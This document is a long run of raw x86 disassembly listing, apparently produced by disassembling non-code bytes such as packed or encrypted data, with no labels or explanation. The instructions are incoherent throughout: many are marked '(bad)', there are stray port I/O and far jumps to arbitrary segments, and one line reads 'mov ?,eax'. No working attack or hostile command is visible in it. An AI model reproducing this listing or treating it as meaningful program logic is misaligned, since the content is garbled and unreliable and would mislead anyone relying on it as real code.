  4215ab:	test   BYTE PTR [eax+0x0],0xb6
  4215af:	mov    esi,DWORD PTR [ecx-0x74]
  4215b2:	add    al,BYTE PTR ds:0xd17579b9
  4215b8:	dec    ebx
  4215b9:	sub    esi,DWORD PTR [esi-0x4d04ce50]
  4215bf:	add    al,BYTE PTR [ebp+0x7f]
  4215c2:	sbb    al,0x23
  4215c4:	mov    ebx,0xd3b3b707
  4215c9:	fbld   TBYTE PTR [ebx+esi*4-0x29c9599f]
  4215d0:	sbb    eax,0x24ae4cf
  4215d5:	push   ecx
  4215d6:	sub    dl,cl
  4215d8:	test   DWORD PTR [ebp+0x2864fe62],esi
  4215de:	jp     0x4215ed
  4215e0:	aad    0xf3
  4215e2:	xchg   DWORD PTR [esi],ebp
  4215e4:	sbb    DWORD PTR [ecx+0x70a5b9b2],ebx
  4215ea:	test   esi,edx
  4215ec:	or     eax,0x18a41ab
  4215f1:	loop   0x42163c
  4215f3:	lea    esp,[eax+0x7dca5544]
  4215f9:	out    0xc,eax
  4215fb:	mov    eax,ds:0xae17da11
  421600:	or     eax,0x95fe3af3
  421605:	adc    edx,DWORD PTR [ebx]
  421607:	and    al,0xae
  421609:	nop
  42160a:	das    
  42160b:	shl    DWORD PTR [edi],0x2b
  42160e:	retf   
  42160f:	push   eax
  421610:	cmp    eax,DWORD PTR ds:0x271e05da
  421616:	repnz adc eax,0x1651ad6b
  42161c:	dec    eax
  42161d:	cmp    al,BYTE PTR [edx]
  42161f:	stos   BYTE PTR es:[edi],al
  421620:	leave  
  421621:	jge    0x421631
  421623:	arpl   WORD PTR [ebx-0xe],bp
  421626:	sti    
  421627:	xchg   ecx,eax
  421628:	imul   esi,ecx,0x4dc74c1b
  42162e:	ret    
  42162f:	repz dec ebp
  421631:	or     DWORD PTR [edx+esi*4],edx
  421634:	xchg   ebx,eax
  421636:	pop    eax
  421637:	or     edi,DWORD PTR [ebx+0x29d128c5]
  42163d:	(bad)  
  42163e:	mov    WORD PTR [ebx],gs
  421640:	(bad)  
  421642:	leave  
  421643:	dec    ebp
  421644:	pop    ebx
  421645:	xor    eax,DWORD PTR [esi+eax*2+0x1afc8188]
  42164c:	sub    bh,BYTE PTR [eax+0x34]
  42164f:	test   al,0x64
  421651:	adc    eax,0xfc26446e
  421656:	pushf  
  421657:	push   esi
  421658:	inc    ebp
  421659:	push   esi
  42165a:	mov    ebx,0xc3493be8
  42165f:	push   ss
  421660:	and    BYTE PTR ss:[esp+eax*1-0x658bd746],bl
  421668:	mov    ah,0x31
  42166a:	add    dl,BYTE PTR [edi]
  42166c:	stos   DWORD PTR es:[edi],eax
  42166d:	lods   al,BYTE PTR ds:[esi]
  42166e:	fnstsw WORD PTR [ecx]
  421670:	lea    edx,[ebp-0x7a058822]
  421676:	adc    eax,ebp
  421678:	idiv   BYTE PTR [edx+0x7bca3e6c]
  42167e:	inc    eax
  42167f:	inc    esi
  421680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421681:	push   DWORD PTR [eax+ecx*2-0xb]
  421685:	scas   eax,DWORD PTR es:[edi]
  421686:	retf   
  421687:	rcl    BYTE PTR [esi],1
  421689:	and    bh,BYTE PTR [ecx]
  42168b:	jbe    0x42160f
  42168d:	push   es
  42168e:	pop    ds
  42168f:	sub    al,0x24
  421691:	pop    es
  421692:	mov    edx,0x261aa3d9
  421697:	stc    
  421698:	jecxz  0x4216c5
  42169a:	retf   
  42169b:	std    
  42169c:	xor    al,0xc5
  42169e:	popf   
  42169f:	inc    edi
  4216a0:	mov    dh,BYTE PTR [eax+0x456b5438]
  4216a6:	sub    ch,ah
  4216a8:	loopne 0x4216c1
  4216aa:	and    eax,0xf68b09a6
  4216af:	jecxz  0x421722
  4216b1:	xchg   BYTE PTR [ebx],bh
  4216b3:	pop    es
  4216b4:	pop    edx
  4216b5:	mov    dl,0xc4
  4216b7:	test   ebx,esi
  4216b9:	pop    ebp
  4216ba:	scas   al,BYTE PTR es:[edi]
  4216bb:	int    0x13
  4216bd:	gs jno 0x421650
  4216c0:	ficom  DWORD PTR [eax+esi*8]
  4216c3:	(bad)  
  4216c4:	jmp    0x4216f8
  4216c6:	push   edx
  4216c7:	div    BYTE PTR [ebp-0x1d]
  4216ca:	cld    
  4216cb:	push   esp
  4216cc:	retf   0xce49
  4216cf:	scas   al,BYTE PTR es:[edi]
  4216d0:	push   ss
  4216d1:	ins    DWORD PTR es:[edi],dx
  4216d2:	and    ah,BYTE PTR [ebx]
  4216d4:	mov    ah,0xa1
  4216d6:	sbb    eax,0xb69dbfbc
  4216db:	push   ds
  4216dc:	leave  
  4216dd:	xor    al,BYTE PTR [edx-0x28100120]
  4216e3:	xchg   ecx,eax
  4216e4:	aas    
  4216e5:	mov    bh,0xce
  4216e7:	pop    ebx
  4216e8:	(bad)  
  4216e9:	jg     0x4216eb
  4216eb:	test   DWORD PTR [edi],ebp
  4216ed:	add    eax,0x73831851
  4216f2:	xchg   ecx,eax
  4216f3:	xchg   ebp,eax
  4216f4:	pop    ds
  4216f5:	pop    es
  4216f6:	mov    ebp,DWORD PTR [ebx+esi*2+0x6c4125d3]
  4216fd:	cmp    ah,BYTE PTR [eax+0x2b6e8e24]
  421703:	(bad)  
  421705:	mov    eax,ds:0xf0b6d32d
  42170a:	js     0x4216f5
  42170c:	fldenv [eiz*4+0x62f2c39c]
  421713:	jno    0x42172a
  421715:	sub    dh,al
  421717:	ficom  WORD PTR ds:[ebx+0x6ee5b13c]
  42171e:	lds    edx,FWORD PTR [ebx+0x71c184fc]
  421724:	pop    ebp
  421725:	stos   WORD PTR es:[edi],ax
  421727:	clc    
  421728:	clc    
  421729:	or     eax,0xec3af458
  42172e:	sti    
  42172f:	mov    ?,eax
  421731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421732:	cmp    ah,bl
  421734:	sub    ebp,DWORD PTR [esi+esi*2-0x5bcb0166]
  42173b:	cwde   
  42173c:	jnp    0x4216d8
  42173e:	inc    esi
  42173f:	loop   0x4216fb
  421741:	fisubr DWORD PTR [ebx]
  421743:	out    0x56,eax
  421745:	dec    ecx
  421746:	mov    al,BYTE PTR [ebx]
  421748:	ja     0x42171e
  42174a:	out    0xcf,eax
  42174c:	mov    cl,0xc5
  42174e:	mov    esi,cs
  421750:	retf   0x4b71
  421753:	ins    BYTE PTR es:[edi],dx
  421754:	mov    al,ds:0x8da929be
  421759:	xchg   esi,eax
  42175a:	test   eax,0x1a7bc361
  42175f:	ins    DWORD PTR es:[edi],dx
  421760:	addr16 out dx,eax
  421762:	and    ah,BYTE PTR [edi-0x2b2a441e]
  421768:	imul   ebp,DWORD PTR [edi+ecx*1-0x4547c14f],0xaf6fd9e0
  421773:	push   0xf89039db
  421778:	sti    
  421779:	cmp    eax,0x22296110
  42177e:	xchg   ebx,eax
  42177f:	mov    ds:0xcb2dfcce,al
  421784:	fsub   QWORD PTR [ebp+0x4]
  421787:	dec    edi
  421788:	ror    DWORD PTR [eax+eiz*8+0x69],cl
  42178c:	add    cl,BYTE PTR [ecx+0x59d671ed]
  421792:	pop    ebp
  421793:	loope  0x42173a
  421795:	int    0x84
  421797:	or     DWORD PTR fs:[ebp-0x3c374efa],0x4b
  42179f:	test   eax,0x3606b75e
  4217a4:	fs into 
  4217a6:	sbb    DWORD PTR [edx],0xb11ac77f
  4217ac:	enter  0x37d7,0xf7
  4217b0:	inc    ebx
  4217b1:	and    BYTE PTR [edi+edx*4-0x4e],bl
  4217b5:	ja     0x421818
  4217b7:	fwait
  4217b8:	ret    
  4217b9:	add    DWORD PTR [edx-0x1d39e9f5],edx
  4217bf:	stos   BYTE PTR es:[edi],al
  4217c0:	call   0x3aa6e032
  4217c5:	(bad)  
  4217c7:	add    edi,esp
  4217c9:	arpl   WORD PTR [ebx+0x78],dx
  4217cc:	in     al,dx
  4217cd:	sub    BYTE PTR [si-0x31],ch
  4217d1:	mov    ecx,ds
  4217d3:	lods   al,BYTE PTR ds:[esi]
  4217d4:	push   eax
  4217d5:	(bad)  
  4217d6:	fldenv [edi]
  4217d8:	fmul   st,st(5)
  4217da:	xchg   ebp,eax
  4217db:	cld    
  4217dc:	pop    edi
  4217dd:	in     al,0x90
  4217df:	xchg   edi,edi
  4217e1:	add    al,BYTE PTR [ebx]
  4217e3:	scas   eax,DWORD PTR es:[edi]
  4217e4:	je     0x42180a
  4217e6:	xchg   ah,dh
  4217e8:	jae    0x421869
  4217ea:	test   eax,0x20874bc1
  4217ef:	add    bl,ch
  4217f1:	mov    eax,ds:0x95187a0d
  4217f6:	fwait
  4217f7:	xor    eax,0xe7395fdd
  4217fc:	sbb    eax,0x7a13fd98
  421801:	stos   BYTE PTR es:[edi],al
  421802:	jne    0x4217e7
  421804:	and    bh,ch
  421806:	imul   ebp,DWORD PTR [eax],0xbe9bedfd
  42180c:	pop    ebp
  42180d:	inc    esp
  42180e:	cwde   
  42180f:	(bad)  
  421810:	xor    ebp,DWORD PTR [ebx]
  421812:	or     eax,0xe2648ef9
  421817:	aas    
  421818:	sar    cl,1
  42181a:	xor    eax,0xebcdcd45
  42181f:	fcomi  st,st(1)
  421821:	outs   dx,DWORD PTR ds:[esi]
  421822:	imul   eax,DWORD PTR [eax+0x34],0x15
  421826:	(bad)  
  421828:	in     al,dx
  421829:	jb     0x421831
  42182b:	stos   BYTE PTR es:[edi],al
  42182c:	cdq    
  42182d:	cmp    ah,BYTE PTR [ebx]
  42182f:	mov    WORD PTR [eax-0x4d57ef41],ds
  421835:	cwde   
  421836:	dec    ebx
  421837:	lods   al,BYTE PTR ds:[esi]
  421838:	pop    edx
  421839:	ins    DWORD PTR es:[edi],dx
  42183a:	or     DWORD PTR [ebp+0x4688770f],ebp
  421840:	outs   dx,BYTE PTR ds:[esi]
  421841:	fsubrp st(3),st
  421843:	arpl   WORD PTR [ebx],si
  421845:	iretw  
  421847:	addr16 rol dl,0xfe
  42184b:	mov    al,ds:0x104b35c9
  421850:	mov    al,ds:0x25034775
  421855:	jns    0x421825
  421857:	not    BYTE PTR [edx]
  421859:	call   0x4ad8:0xcc7a44e0
  421860:	out    0xd8,al
  421862:	and    eax,0xe80cd066
  421867:	daa    
  421868:	in     al,0xa2
  42186a:	fcom   QWORD PTR [ebx]
  42186c:	ret    
  42186d:	cld    
  42186e:	sub    bl,BYTE PTR [ebx+0x4cf35c4f]
  421874:	xchg   ecx,eax
  421875:	and    ebp,DWORD PTR [ebx]
  421877:	lock mov ds:0x88e8ce1,eax
  42187d:	ss mov edx,0x28727fd7
  421883:	jb     0x4218e2
  421885:	in     eax,0x27
  421887:	mov    esp,0xf87424f3
  42188c:	sub    al,0x9b
  42188e:	dec    edx
  42188f:	push   edx
  421890:	mov    WORD PTR [eax+0x4aefee5d],fs
  421896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421897:	sub    BYTE PTR [edx+0x28566fdb],dl
  42189d:	call   0x7618:0x6879
  4218a3:	pop    ebx
  4218a4:	aaa    
  4218a5:	fistp  QWORD PTR [ecx-0x76]
  4218a8:	test   al,0x55
  4218aa:	push   0x81d0412c
  4218af:	call   0xcc760fa8
  4218b4:	or     dl,BYTE PTR es:[ecx-0x5a]
  4218b8:	les    ecx,FWORD PTR [ebp+0x41]
  4218bb:	cmp    BYTE PTR [ebx+0x3125ce89],dl
  4218c1:	or     al,0x6d
  4218c3:	jmp    0xa753:0x6d6cdc5a
  4218ca:	aam    0x60
  4218cc:	add    al,BYTE PTR [esi]
  4218ce:	arpl   WORD PTR [edi-0x73],sp
  4218d1:	into   
  4218d2:	repnz xchg ecx,eax
  4218d4:	stos   BYTE PTR es:[edi],al
  4218d5:	clc    
  4218d6:	and    esi,DWORD PTR [esi+0x2b]
  4218d9:	outs   dx,DWORD PTR ds:[esi]
  4218da:	jmp    DWORD PTR [edx+esi*2-0x1e]
  4218de:	loopne 0x4218ed
  4218e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e1:	mov    esp,0x1f2ea7de
  4218e6:	inc    ebx
  4218e7:	shl    dh,cl
  4218e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ea:	mov    ebp,DWORD PTR [esi+0x425547da]
  4218f0:	jge    0x421941
  4218f2:	and    al,0xf6
  4218f4:	sub    BYTE PTR [edx],dl
  4218f6:	mov    bh,0xf6
  4218f8:	frstor [ebp-0x126118c9]
  4218fe:	retf   
  4218ff:	inc    edi
  421900:	lods   al,BYTE PTR ds:[esi]
  421901:	sbb    eax,0x7b767284
  421906:	cli    
  421907:	fcmovnbe st,st(1)
  421909:	mov    ds:0xd859b522,al
  42190e:	push   edx
  42190f:	rcl    BYTE PTR [ecx+0x618c38cd],cl
  421915:	inc    si
  421917:	cmp    al,0xa
  421919:	dec    edi
  42191a:	mov    al,ds:0xbf24bb8b
  42191f:	repz push 0x92fb7206
  421925:	mov    ah,0xce
  421927:	push   eax
  421928:	xchg   ecx,eax
  421929:	out    dx,eax
  42192a:	add    eax,0x308e7bd6
  42192f:	push   edx
  421930:	push   esp
  421931:	pop    DWORD PTR [edx]
  421933:	shl    DWORD PTR [edx],1
  421935:	push   edi
  421936:	ficomp DWORD PTR [edx-0x1ecbad1d]
  42193c:	xor    eax,0x99daed71
  421941:	cli    
  421942:	xor    esi,DWORD PTR [ebx-0x29]
  421945:	add    DWORD PTR [edx-0x3c],eax
  421948:	repnz int3 
  42194a:	jnp    0x4219a0
  42194c:	cmp    BYTE PTR [ebp+0x4b],dh
  42194f:	mov    eax,ds
  421951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421952:	fistp  QWORD PTR [eax]
  421954:	xor    edi,esi
  421956:	fs jmp 0x8e41:0x23bce5c0
  42195e:	mov    eax,0x3a7983f7
  421963:	test   bh,bh
  421965:	mov    dh,0xc0
  421967:	std    
  421968:	sub    DWORD PTR [ebp-0x439de6a1],edi
  42196e:	cmp    ebx,DWORD PTR [edx-0x4e]
  421971:	mov    DWORD PTR [esi+0x5],ebx
  421974:	dec    ecx
  421975:	pop    ss
  421976:	jne    0x4218fe
  421978:	sub    ecx,esp
  42197a:	or     DWORD PTR [di-0x18],esi
  42197e:	or     ebp,DWORD PTR [ebp+0x244735ff]
  421984:	xor    DWORD PTR [ebx-0x2bf7b096],ecx
  42198a:	popa   
  42198b:	xchg   DWORD PTR [ebp+0x4a],esp
  42198e:	setl   BYTE PTR [edx+0x69294d05]
  421995:	adc    eax,0xffcdb317
  42199a:	jl     0x4219d4
  42199c:	aad    0x8a
  42199e:	xchg   edx,eax
  42199f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a0:	fbld   TBYTE PTR [ebx+edx*8+0x7d4266e3]
  4219a7:	sbb    al,BYTE PTR [eax]
  4219a9:	cmp    eax,0x8239d94b
  4219ae:	out    0x9f,al
  4219b0:	fiadd  WORD PTR [eax+0x31]
  4219b3:	test   bl,bl
  4219b5:	ja     0x4219cb
  4219b7:	add    al,0xcd
  4219b9:	stc    
  4219ba:	or     ah,0xcb
  4219bd:	add    esi,DWORD PTR [edi-0x4]
  4219c0:	mov    esi,0xd3a8f93d
  4219c5:	adc    eax,0xadfc69de
  4219ca:	or     BYTE PTR [ebp+0x51],al
  4219cd:	adc    DWORD PTR ds:0x64980c45,0xb30564ed
  4219d7:	add    eax,0xe4039fd9
  4219dc:	repz fs mov dl,0x21
  4219e0:	mov    ds,WORD PTR [esi+edi*1]
  4219e3:	cmp    DWORD PTR [esp+eiz*4],ebp
  4219e6:	add    DWORD PTR [eax+0x61084fc9],esp
  4219ec:	aam    0xca
  4219ee:	mov    ah,BYTE PTR [edi+0x32]
  4219f1:	cdq    
  4219f2:	add    al,0x2e
  4219f4:	push   edi
  4219f5:	jmp    0xe529:0x8c628cbc
  4219fc:	push   esi
  4219fd:	ss rol esp,cl
  421a00:	and    dl,BYTE PTR [esi+0x6f8c3d80]
  421a06:	leave  
  421a07:	mov    al,BYTE PTR [ebp-0x23]
  421a0a:	pop    edi
  421a0b:	and    DWORD PTR [edi+0x3d],esi
  421a0e:	mov    dh,0xe3
  421a10:	push   ebp
  421a11:	sar    BYTE PTR [ebx],cl
  421a13:	mov    WORD PTR [edi],gs
  421a15:	sbb    eax,0x6fd3703
  421a1a:	shl    esi,0x20
  421a1d:	shl    DWORD PTR [ebp+0x10abb556],1
  421a23:	or     BYTE PTR ds:[ecx],cl
  421a26:	cld    
  421a27:	shl    BYTE PTR [ebx],cl
  421a29:	xchg   edx,eax
  421a2a:	xor    eax,DWORD PTR [eax]
  421a2c:	cmc    
  421a2d:	jae    0x421a35
  421a2f:	cdq    
  421a30:	dec    edi
  421a31:	xchg   ebx,eax
  421a32:	retf   0xe564
  421a35:	setns  BYTE PTR [edx+0x49]
  421a39:	pusha  
  421a3a:	aaa    
  421a3b:	retf   0xe4e0
  421a3e:	scas   eax,DWORD PTR es:[edi]
  421a3f:	in     al,dx
  421a40:	enter  0xb3a5,0x9d
  421a44:	rcl    BYTE PTR [eax],1
  421a46:	sti    
  421a47:	(bad)  
  421a48:	sbb    dl,BYTE PTR [ebp-0x54]
  421a4b:	cmp    BYTE PTR [edx+0x2d],0x25
  421a4f:	jl     0x421a1c
  421a51:	and    cl,BYTE PTR [ecx-0xc]
  421a54:	xchg   eax,esi
  421a56:	lea    esi,[edx+0x792f4870]
  421a5c:	adc    DWORD PTR [eax],ebp
  421a5e:	or     bh,ah
  421a60:	xchg   esp,eax
  421a61:	mov    ds:0xa4cb0ba1,eax
  421a66:	pop    ss
  421a67:	aaa    
  421a68:	call   0x8000:0xe998d598
  421a6f:	cmp    al,0x3c
  421a71:	sar    BYTE PTR [ecx],1
  421a73:	push   edx
  421a74:	inc    edx
  421a75:	or     ebx,DWORD PTR [ebp-0x3c]
  421a78:	and    ebp,edi
  421a7a:	outs   dx,DWORD PTR ds:[esi]
  421a7b:	jmp    0x6a2d32
  421a80:	test   BYTE PTR [edx-0x26dacf6b],0xb7
  421a87:	lods   eax,DWORD PTR ds:[esi]
  421a88:	test   al,0x46
  421a8a:	sub    dl,al
  421a8c:	or     BYTE PTR [ecx-0x1e0a81cb],bl
  421a92:	adc    dh,bh
  421a94:	test   eax,0xf25442d3
  421a99:	imul   DWORD PTR ds:0xbd0f759a
  421a9f:	test   eax,0x33e286fc
  421aa4:	fistp  DWORD PTR [ebp-0x5e]
  421aa7:	dec    ebx
  421aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aa9:	(bad)
  421aad:	rcr    eax,cl
  421aaf:	sar    bl,1
  421ab1:	dec    ebp
  421ab2:	loopne 0x421acc
  421ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ab5:	aam    0x3c
  421ab7:	push   ecx
  421ab8:	int3   
  421ab9:	xchg   ecx,eax
  421aba:	fst    QWORD PTR [ecx]
  421abc:	sbb    eax,0xea09801e
  421ac1:	or     eax,0xb4d2fe45
  421ac6:	fnstsw WORD PTR [edi-0x2a3e6a09]
  421acc:	sbb    eax,0x9866f954
  421ad1:	jge    0x421a79
  421ad3:	bound  esp,QWORD PTR [ebp+0x52]
  421ad6:	or     ch,BYTE PTR [ebp+0x2]
  421ad9:	test   BYTE PTR [edi+0x3045327e],dh
  421adf:	add    eax,0x646ba6c4
  421ae4:	out    0xf6,eax
  421ae6:	mov    esi,0xab13bd9e
  421aeb:	mov    bl,dl
  421aed:	sti    
  421aee:	fnstsw WORD PTR [edi+0x64c112ec]
  421af4:	sbb    eax,0xe16a2d54
  421af9:	sbb    eax,0x9264ad5b
  421afe:	dec    edx
  421aff:	cmp    al,BYTE PTR [ebx]
  421b01:	xor    BYTE PTR [ecx+edi*8],bh
  421b04:	inc    edi
  421b05:	cmp    al,BYTE PTR [eax+0x9a4e77]
  421b0b:	and    eax,ecx
  421b0d:	or     ebp,eax
  421b0f:	xchg   edx,eax
  421b10:	mov    ebp,0xda55ebdb
  421b15:	stc    
  421b16:	fnstsw WORD PTR [edi-0x723e5137]
  421b1c:	sbb    eax,0xf26a0054
  421b21:	test   eax,0x82aca05b
  421b26:	adc    al,0x5f
  421b28:	fldcw  WORD PTR [eax-0x8ac2dc3]
  421b2e:	add    dl,dl
  421b30:	montmul (bad)
  421b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b32:	test   DWORD PTR [ecx-0x6d9a89bf],esi
  421b38:	mov    ebp,0x8be0ff20
  421b3d:	icebp  
  421b3e:	std    
  421b3f:	nop
  421b40:	mov    ebp,0xdb4febfb
  421b45:	inc    edx
  421b46:	imul   esp,DWORD PTR [ecx],0xffffffe6
  421b49:	jne    0x421bbd
  421b4b:	mov    al,0x92
  421b4d:	xor    DWORD PTR [ebx],esi
  421b4f:	mov    al,0xd9
  421b51:	in     al,dx
  421b52:	(bad)  
  421b53:	push   edi
  421b54:	pop    esi
  421b55:	shl    BYTE PTR [eax],cl
  421b57:	mov    al,0xd9
  421b59:	aad    0xc7
  421b5b:	push   ds
  421b5c:	pop    edi
  421b5d:	add    al,0x85
  421b5f:	pop    ebp
  421b60:	jb     0x421b1c
  421b62:	ficomp DWORD PTR [ebx-0x1e42fdc4]
  421b68:	sbb    esi,DWORD PTR [eax+0x73]
  421b6b:	out    dx,eax
  421b6c:	cmp    edx,DWORD PTR ss:[eax]
  421b6f:	jle    0x421b8c
  421b71:	js     0x421bd2
  421b73:	out    dx,eax
  421b74:	xor    bh,BYTE PTR [esi-0x41]
  421b77:	dec    edi
  421b78:	pop    ebx
  421b79:	inc    ebx
  421b7a:	jns    0x421b3d
  421b7c:	or     al,cl
  421b7e:	ror    ah,cl
  421b80:	fild   WORD PTR [edx+0x1f]
  421b83:	shl    BYTE PTR [ebx-0x27],1
  421b86:	push   es
  421b87:	scas   eax,DWORD PTR es:[edi]
  421b88:	mov    esi,0x83ffba45
  421b8d:	mov    fs,ebx
  421b8f:	aas    
  421b90:	clc    
  421b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b92:	mov    bl,0x15
  421b94:	and    BYTE PTR [ebx+0x42],bl
  421b97:	xlat   BYTE PTR ds:[ebx]
  421b98:	(bad)  
  421b99:	xchg   edi,eax
  421b9a:	push   ebx
  421b9b:	out    dx,eax
  421b9c:	addr16 push ss
  421b9e:	mov    ds:0x2836b29,al
  421ba3:	mov    eax,ds:0xf9d14c7
  421ba8:	pop    ds
  421ba9:	lea    ecx,[edi-0x5f]
  421bac:	sub    bl,BYTE PTR [edx-0x4315430e]
  421bb2:	sub    esi,esp
  421bb4:	sub    ebp,DWORD PTR [edx-0x37]
  421bb7:	mov    edi,0xd1691d0a
  421bbc:	add    DWORD PTR [edi],ebx
  421bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bbf:	dec    esi
  421bc0:	fild   DWORD PTR [ebp+0x6b]
  421bc3:	xor    eax,0xd725b22
  421bc8:	cmp    al,cl
  421bca:	jae    0x421b58
  421bcc:	ror    BYTE PTR [ebx+0x617a8ddc],cl
  421bd2:	jecxz  0x421b61
  421bd4:	mov    bl,0x54
  421bd6:	pop    edx
  421bd7:	es jp  0x421c56
  421bda:	push   ebx
  421bdb:	out    dx,al
  421bdc:	xor    dl,BYTE PTR [ebx+0xa8a565a]
  421be2:	mov    dl,0x91
  421be4:	shl    DWORD PTR [edi],1
  421be6:	loopne 0x421c36
  421be8:	ins    DWORD PTR es:[edi],dx
  421be9:	cdq    
  421bea:	inc    esp
  421beb:	inc    ebp
  421bec:	cmp    dh,BYTE PTR [ebx-0x78]
  421bef:	outs   dx,BYTE PTR ds:[esi]
  421bf0:	mov    esi,DWORD PTR [ecx-0x7a3c1757]
  421bf6:	add    bl,bh
  421bf8:	dec    esi
  421bf9:	sbb    BYTE PTR [edx],bh
  421bfb:	xchg   ecx,eax
  421bfc:	or     dl,bl
  421bfe:	add    al,0x9a
  421c00:	jecxz  0x421bae
  421c02:	ret    
  421c03:	fs jecxz 0x421bdb
  421c06:	jbe    0x421bbf
  421c08:	mov    fs,ebp
  421c0a:	test   BYTE PTR [ecx],dh
  421c0c:	cmp    esp,DWORD PTR [edi]
  421c0e:	fisttp DWORD PTR [esi+0x6e]
  421c11:	and    ah,bl
  421c13:	call   0x7ce426af
  421c18:	inc    bp
  421c1a:	pop    edi
  421c1b:	mov    eax,ds:0x3ae12cac
  421c20:	cmp    BYTE PTR [ebp+0x3300cdb7],dh
  421c26:	push   esi
  421c27:	ins    BYTE PTR es:[edi],dx
  421c28:	push   cs
  421c29:	push   ss
  421c2a:	pop    ds
  421c2b:	shr    bl,cl
  421c2d:	add    BYTE PTR [eax],0x32
  421c30:	imul   edi,DWORD PTR [ecx-0x2e4f7f00],0xa6c63d86
  421c3a:	cmp    esp,DWORD PTR [edx-0x1f]
  421c3d:	call   DWORD PTR [eax-0x6e]
  421c40:	fild   DWORD PTR [ebp-0x4f]
  421c43:	xchg   BYTE PTR [ecx],ch
  421c45:	arpl   WORD PTR [edi+0x16],cx
